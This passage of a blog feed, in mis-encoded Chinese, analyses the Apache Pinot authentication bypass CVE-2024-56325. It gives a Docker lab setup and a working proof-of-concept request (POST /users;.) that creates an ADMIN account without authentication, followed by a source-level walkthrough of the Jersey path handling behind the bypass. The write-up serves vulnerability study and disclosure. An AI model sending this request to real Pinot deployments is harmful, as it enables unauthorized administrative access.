è¿™ä¸ªç±»çš„å°±æ˜¯å¯»æ‰¾ user è¡¨ï¼‰</p><p>è€Œä¸”ä»–æ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¹Ÿæ˜¯ç»™æ•´ä¸ªè¡¨çš„å­—æ®µæŸ¥è¯¢å‡ºæ¥ç„¶åç”¨ isset å»åˆ¤æ–­çš„ï¼Œä¹Ÿä¸å­˜åœ¨ SQL å¯æ§ï¼Œæ‰€ä»¥å°±æ²¡æ³•åœ¨è¿™æ„é€ å…¶ä»–éé¢„æœŸçš„è¯­å¥äº†</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2025/04/attach-61ab433cdc31055c8a8be15b180b2f951bfe497a.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">hasField</span>(<span class="params"><span class="variable">$fieldName</span>, <span class="variable">$tableName</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$schema</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTableSchema</span>(<span class="variable">$tableName</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$schema</span>[<span class="string">&#x27;fields&#x27;</span>][<span class="variable">$fieldName</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>å¦‚æœ‰é”™è¯¯ï¼Œè¯·å„ä½çœ‹å®˜å¤§ä½¬å¤šå¤šæŒ‡ç‚¹</p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Pinot CVE-2024-56325 Authentication Bypass æ¼æ´åˆ†æ</title>
      <link href="/2025/04/03/Apache%20Pinot%20CVE-2024-56325%20Authentication%20Bypass%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2025/04/03/Apache%20Pinot%20CVE-2024-56325%20Authentication%20Bypass%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‰ä¸¤å¤©çœ‹åˆ°è¿™æ¡é€šå‘Šï¼Œä¸€æœå‘ç°è¯„åˆ† 9.8ï¼Œäºæ˜¯åˆ†æä¸€ä¸‹å…·ä½“æ€ä¹ˆä¸ªäº‹</p><p><a href="https://www.openwall.com/lists/oss-security/2025/03/27/8">https://www.openwall.com/lists/oss-security/2025/03/27/8</a></p><h1 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h1><p>Apache Pinot æ˜¯ä¸€ä¸ªå®æ—¶åˆ†å¸ƒå¼çš„ OLAP æ•°æ®å­˜å‚¨å’Œåˆ†æç³»ç»Ÿã€‚ä½¿ç”¨å®ƒå®ç°ä½å»¶è¿Ÿå¯ä¼¸ç¼©çš„å®æ—¶åˆ†æã€‚Pinot ä»ç¦»çº¿æ•°æ®æºï¼ˆåŒ…æ‹¬ Hadoop å’Œå„ç±»æ–‡ä»¶ï¼‰å’Œåœ¨çº¿æ•°æ®æºï¼ˆå¦‚ Kafkaï¼‰ä¸­æ”«å–æ•°æ®è¿›è¡Œåˆ†æã€‚</p><p>Apache Pinot å­˜åœ¨èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ã€‚å¦‚æœè·¯å¾„ä¸åŒ…å« <code>/</code> ä¸”åŒ…å« <code>.</code>åˆ™ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚</p><h1 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h1><p>Apache Pinot &lt; 1.3</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>å‚è€ƒå®˜æ–¹æ–‡æ¡£</p><p><a href="https://docs.pinot.apache.org/basics/getting-started/running-pinot-in-docker">https://docs.pinot.apache.org/basics/getting-started/running-pinot-in-docker</a></p><p>è¿™é‡Œéœ€è¦å¼€å¯è®¤è¯æœºåˆ¶ï¼ˆæ–‡æ¡£ç»™çš„å‘½ä»¤æ˜¯æ²¡å¼€çš„ï¼‰ï¼Œå‘½ä»¤ä¸­è®¾ç½® <code>-type</code> å‚æ•°ä¸º auth å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">    -p 2123:2123 \</span><br><span class="line">    -p 9000:9000 \</span><br><span class="line">    -p 8000:8000 \</span><br><span class="line">    -p 7050:7050 \</span><br><span class="line">    -p 6000:6000 \</span><br><span class="line">    apachepinot/pinot:1.2.0 QuickStart \</span><br><span class="line">    -<span class="built_in">type</span> auth</span><br></pre></td></tr></table></figure><p>å¦‚éœ€è°ƒè¯•å¯ä»¥ç”¨ä»¥ä¸‹æ“ä½œ</p><p>é¦–å…ˆå¯åŠ¨å®¹å™¨ï¼Œæ›¿æ¢ entrypoint å‘½ä»¤ä¸º &#x2F;bin&#x2F;bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 5005:5005 -p 2123:2123 -p 9000:9000 -p 8000:8000 -p 7050:7050 -p 6000:6000 --entrypoint /bin/bash apachepinot/pinot:1.2.0</span><br></pre></td></tr></table></figure><p>ç„¶åè‡ªè¡Œæ‰‹åŠ¨å¯åŠ¨ï¼Œå¹¶æ·»åŠ è°ƒè¯•çš„å‚æ•°<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/jvm/java-17-amazon-corretto/bin/java --add-opens=java.base/java.nio=ALL-UNNAMED --add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED -Xms4G -Xmx4G -Dpinot.admin.system.exit=<span class="literal">false</span> -Dplugins.<span class="built_in">dir</span>=/opt/pinot/plugins -classpath /opt/pinot/lib/*:/opt/pinot/plugins/pinot-stream-ingestion/pinot-pulsar/pinot-pulsar-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-stream-ingestion/pinot-kinesis/pinot-kinesis-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-stream-ingestion/pinot-kafka-2.0/pinot-kafka-2.0-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-batch-ingestion/pinot-batch-ingestion-standalone/pinot-batch-ingestion-standalone-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-minion-tasks/pinot-minion-builtin-tasks/pinot-minion-builtin-tasks-1.2.0.jar:/opt/pinot/plugins/pinot-segment-uploader/pinot-segment-uploader-default/pinot-segment-uploader-default-1.2.0.jar:/opt/pinot/plugins/pinot-segment-writer/pinot-segment-writer-file-based/pinot-segment-writer-file-based-1.2.0.jar:/opt/pinot/plugins/pinot-metrics/pinot-dropwizard/pinot-dropwizard-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-metrics/pinot-yammer/pinot-yammer-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-avro/pinot-avro-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-csv/pinot-csv-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-json/pinot-json-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-parquet/pinot-parquet-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-protobuf/pinot-protobuf-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-thrift/pinot-thrift-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-orc/pinot-orc-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-confluent-avro/pinot-confluent-avro-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-clp-log/pinot-clp-log-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-file-system/pinot-adls/pinot-adls-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-file-system/pinot-hdfs/pinot-hdfs-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-file-system/pinot-gcs/pinot-gcs-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-file-system/pinot-s3/pinot-s3-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-environment/pinot-azure/pinot-azure-1.2.0-shaded.jar -Dapp.name=pinot-admin -Dapp.pid=1 -Dapp.repo=/opt/pinot/lib -Dapp.home=/opt/pinot -Dbasedir=/opt/pinot -agentlib:jdwp=transport=dt_socket,server=y,<span class="built_in">suspend</span>=n,address=*:5005 org.apache.pinot.tools.admin.PinotAdministrator QuickStart -<span class="built_in">type</span> auth</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/5ceda7e3dcb512b0beb9f74e268ec5d2.png" alt="img"></p><p>è®¿é—® ip:9000 ç«¯å£å³å¯çœ‹åˆ° Apache Pinot Controller çš„è®¤è¯é¡µé¢</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/c77fa486c7cd1086a13954d56f067c02.png" alt="img"></p><p>IDEA è¿œç¨‹è°ƒè¯•çš„æ­¥éª¤è¿™é‡Œä¸å†èµ˜è¿°ã€‚</p><p>Apache Pinot ä¸‹è½½åœ°å€</p><p><a href="https://pinot.apache.org/download/">https://pinot.apache.org/download/</a></p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p>é¢„æœŸè¯·æ±‚ï¼Œæœªè®¤è¯ä¼šå“åº” 401</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/users</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>180</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;hack10&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hack&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;component&quot;</span>: <span class="string">&quot;CONTROLLER&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;role&quot;</span>: <span class="string">&quot;ADMIN&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;tables&quot;</span>: [],</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;permissions&quot;</span>: [],</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;usernameWithComponent&quot;</span>: <span class="string">&quot;hack_CONTROLLER&quot;</span></span></span><br><span class="line"><span class="language-prolog">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/0b21db459973689c200714daef636826.png" alt="img"></p><p>æ„é€ å¦‚ä¸‹ Poc å¯æˆåŠŸç»•è¿‡èº«ä»½è®¤è¯</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/users;.</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>180</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;hack10&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hack&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;component&quot;</span>: <span class="string">&quot;CONTROLLER&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;role&quot;</span>: <span class="string">&quot;ADMIN&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;tables&quot;</span>: [],</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;permissions&quot;</span>: [],</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;usernameWithComponent&quot;</span>: <span class="string">&quot;hack_CONTROLLER&quot;</span></span></span><br><span class="line"><span class="language-prolog">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/e84da280f2c50ca1f7696298c65ee8cb.png" alt="img"></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>ä¸»è¦å…³æ³¨ org.apache.pinot.controller.api è¿™ä¸ªåŒ…</p><p>åˆ¤æ–­è¯·æ±‚æ˜¯å¦éœ€è¦è®¤è¯çš„æ–¹æ³•ä¸º</p><p><code>org.apache.pinot.controller.api.access.AuthenticationFilter#filter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">filter</span><span class="params">(ContainerRequestContext requestContext)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)<span class="built_in">this</span>._requestProvider.get();</span><br><span class="line">    <span class="type">Method</span> <span class="variable">endpointMethod</span> <span class="operator">=</span> <span class="built_in">this</span>._resourceInfo.getResourceMethod();</span><br><span class="line">    <span class="type">AccessControl</span> <span class="variable">accessControl</span> <span class="operator">=</span> <span class="built_in">this</span>._accessControlFactory.create();</span><br><span class="line">    <span class="type">String</span> <span class="variable">endpointUrl</span> <span class="operator">=</span> request.getRequestURI().substring(request.getContextPath().length());</span><br><span class="line">    <span class="type">UriInfo</span> <span class="variable">uriInfo</span> <span class="operator">=</span> requestContext.getUriInfo();</span><br><span class="line">    <span class="keyword">if</span> (!isBaseFile(uriInfo.getPath()) &amp;&amp; !UNPROTECTED_PATHS.contains(uriInfo.getPath())) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!accessControl.protectAnnotatedOnly() || endpointMethod.isAnnotationPresent(Authenticate.class)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!endpointMethod.isAnnotationPresent(ManualAuthorization.class)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">tableName</span> <span class="operator">=</span> extractTableName(uriInfo.getPathParameters(), uriInfo.getQueryParameters());</span><br><span class="line">                <span class="keyword">if</span> (tableName != <span class="literal">null</span>) &#123;</span><br><span class="line">                    tableName = DatabaseUtils.translateTableName(tableName, <span class="built_in">this</span>._httpHeaders);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">AccessType</span> <span class="variable">accessType</span> <span class="operator">=</span> <span class="built_in">this</span>.extractAccessType(endpointMethod);</span><br><span class="line">                AccessControlUtils.validatePermission(tableName, accessType, <span class="built_in">this</span>._httpHeaders, endpointUrl, accessControl);</span><br><span class="line">                FineGrainedAuthUtils.validateFineGrainedAuth(endpointMethod, uriInfo, <span class="built_in">this</span>._httpHeaders, accessControl);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æé€»è¾‘å¯ä»¥å‘ç°ï¼Œè¿™é‡Œçš„åˆ¤æ–­ç”±ä¸¤ä¸ªå› ç´ ç»„æˆï¼Œæ»¡è¶³å…¶ä¸­ä¸€ä¸ªå³å¯ç»•è¿‡è®¤è¯ï¼Œåè€…å°±æ˜¯è®¾ç½®å¥½çš„ç™½åå•ï¼Œç”¨äºå…¬å…±æ¥å£ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/8c9d72cf7d17b748f551615020e6221d.png" alt="img"></p><p>è·Ÿè¿›<code>org.apache.pinot.controller.api.access.AuthenticationFilter#isBaseFile</code></p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/e1a170bf70484387c79e1b34974197c4.png" alt="img"></p><p>å¯ä»¥å‘ç°æ¼æ´å…¬å‘Šæ‰€æåˆ°çš„ â€œIf the path does not contain &#x2F; and contain . authentication is not requiredâ€ã€‚å› æ­¤å½“è¿™ä¸ªå‡½æ•°è¿”å›ä¸º True æ—¶ï¼Œfilter æ–¹æ³•çš„ if åˆ¤æ–­åˆ™ä¸º falseï¼Œå³æ— éœ€è®¤è¯ã€‚</p><p>ç„¶åæˆ‘ä»¬æ¥çœ‹å¦‚ä½•åœ¨å¿…é¡»åŒ…å«<code>.</code>çš„æƒ…å†µä¸‹è®¿é—®æ­£å¸¸çš„æ¥å£ï¼Œä¹Ÿå°±æ˜¯è®©è¿™ä¸ªç‚¹å·ä¸å½±å“æˆ‘ä»¬è·¯ç”±çš„è§£æã€‚å‚è€ƒè¿™ç¯‡æ–‡ç« å¯ä»¥æ‰¾åˆ° Apache Pinot ç”¨çš„è¿™æ¬¾RESTfulæ¡†æ¶ â€”â€” jersey çš„è·¯ç”±è§£æçš„é€»è¾‘å’Œç›¸å…³æºç </p><p><a href="https://blog.csdn.net/qq_30062125/article/details/83758334">https://blog.csdn.net/qq_30062125/article/details/83758334</a></p><p>åœ¨<code>org.glassfish.jersey.server.internal.routing.RoutingStage#apply</code>æ‰“ä¸Šæ–­ç‚¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Stage.Continuation&lt;RequestProcessingContext&gt; <span class="title function_">apply</span><span class="params">(RequestProcessingContext context)</span> &#123;</span><br><span class="line">    <span class="type">ContainerRequest</span> <span class="variable">request</span> <span class="operator">=</span> context.request();</span><br><span class="line">    context.triggerEvent(Type.MATCHING_START);</span><br><span class="line">    <span class="type">TracingLogger</span> <span class="variable">tracingLogger</span> <span class="operator">=</span> TracingLogger.getInstance(request);</span><br><span class="line">    <span class="type">long</span> <span class="variable">timestamp</span> <span class="operator">=</span> tracingLogger.timestamp(ServerTraceEvent.MATCH_SUMMARY);</span><br><span class="line"></span><br><span class="line">    Stage.Continuation var8;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RoutingResult</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>._apply(context, <span class="built_in">this</span>.routingRoot);</span><br><span class="line">        Stage&lt;RequestProcessingContext&gt; nextStage = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (result.endpoint != <span class="literal">null</span>) &#123;</span><br><span class="line">            context.routingContext().setEndpoint(result.endpoint);</span><br><span class="line">            nextStage = <span class="built_in">this</span>.getDefaultNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var8 = Continuation.of(result.context, nextStage);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        tracingLogger.logDuration(ServerTraceEvent.MATCH_SUMMARY, timestamp, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨äº†å‰ç¼€åŒ¹é…<code>Type.MATCHING_START</code>ï¼Œç„¶åç»§ç»­è°ƒè¯•è·Ÿè¿›<code>org.glassfish.jersey.server.internal.routing.RoutingStage#_apply</code></p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/473b038a6e054fe8151d94d7cbd95f08.png" alt="img"></p><p>ç„¶åè·Ÿè¿›<code>org.glassfish.jersey.server.internal.routing.MatchResultInitializerRouter#apply</code>ï¼Œè¿™ä¸ªæ–¹æ³•åœ¨åˆå§‹åŒ–è·¯ç”±åŒ¹é…ä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Router.Continuation <span class="title function_">apply</span><span class="params">(RequestProcessingContext processingContext)</span> &#123;</span><br><span class="line">    <span class="type">RoutingContext</span> <span class="variable">rc</span> <span class="operator">=</span> processingContext.routingContext();</span><br><span class="line">    rc.pushMatchResult(<span class="keyword">new</span> <span class="title class_">SingleMatchResult</span>(<span class="string">&quot;/&quot;</span> + processingContext.request().getPath(<span class="literal">false</span>)));</span><br><span class="line">    <span class="keyword">return</span> Continuation.of(processingContext, <span class="built_in">this</span>.rootRouter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–è¯·æ±‚è·¯å¾„æ—¶å‚æ•°ä¸º falseï¼Œå³è®¾ç½®äº†ä¸è¿›è¡Œ url è§£ç ï¼Œç„¶åä¼ å…¥åˆ° SingleMatchResult ç±»è¿›è¡Œå®ä¾‹åŒ–</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/048af90253dcce890b3f82e291e4dfa5.png" alt="img"></p><p>è·Ÿè¿› <code>SingleMatchResult</code> ç±»å®ä¾‹åŒ–çš„é€»è¾‘ï¼Œå¯ä»¥å‘ç°è¿™é‡Œå¯¹ä¼ å…¥çš„è·¯å¾„è¿›è¡Œäº†å¤„ç†ï¼Œç®€å•è¯´å°±æ˜¯å¿½ç•¥ <code>;</code>å’Œ<code>/</code>ä¹‹é—´çš„å†…å®¹ï¼ŒåŒ…æ‹¬<code>;</code>ï¼Œå¦‚æœ <code>;</code>åé¢æ²¡æœ‰ä¸‹ä¸€ä¸ª<code>/</code>åˆ™å¿½ç•¥ä¹‹åæ‰€æœ‰å†…å®¹ã€‚ä¾‹å¦‚ <code>/aaa;bbb/cccc;dddd</code>ä¼ å…¥è¯¥å‡½æ•°åä¼šè¿”å› <code>/aaa/ccc</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SingleMatchResult</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.path = stripMatrixParams(path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">stripMatrixParams</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">e</span> <span class="operator">=</span> path.indexOf(<span class="number">59</span>);</span><br><span class="line">    <span class="keyword">if</span> (e == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sb.append(path, s, e);</span><br><span class="line">            s = path.indexOf(<span class="number">47</span>, e + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (s == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e = path.indexOf(<span class="number">59</span>, s);</span><br><span class="line">        &#125; <span class="keyword">while</span>(e != -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (s != -<span class="number">1</span>) &#123;</span><br><span class="line">            sb.append(path, s, path.length());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶è¿™é‡Œå°±æ˜¯è®©è·¯å¾„ä¸­åŒ…å«<code>.</code>å·ï¼Œè€Œä¸å½±å“è·¯ç”±è§£æçš„å¥½åŠæ³•ã€‚äºæ˜¯ Poc ä¸­æ„é€ <code>;.</code>åœ¨æ­£å¸¸æ¥å£åè¿›è¡Œç»•è¿‡è®¤è¯æœºåˆ¶ã€‚</p><p>ç„¶åç»™å¤„ç†åçš„è·¯å¾„äº¤ç»™<code>org.glassfish.jersey.server.internal.routing.PathMatchingRouter#apply</code>åŒ¹é…å¯¹åº”çš„è·¯ç”±è§„åˆ™ï¼Œå…ˆåŒ¹é…åˆ° <code>/.*</code>è¿™ä¸ªè§„åˆ™</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/a85c24c2a08366232c2068b8496a32e6.png" alt="img"></p><p>ç„¶åè¿›ä¸€æ­¥åŒ¹é…åˆ°<code>/users(/)?</code>è¿™ä¸ªè§„åˆ™</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/5ed3b9d93910d256d90c1004e17be5fc.png" alt="image"></p><p>æœ€ç»ˆæ‹¿åˆ°å¯¹åº”çš„è·¯ç”±</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/7100d482e1180f25fb6ece92c2100cee.png" alt="img"></p><h1 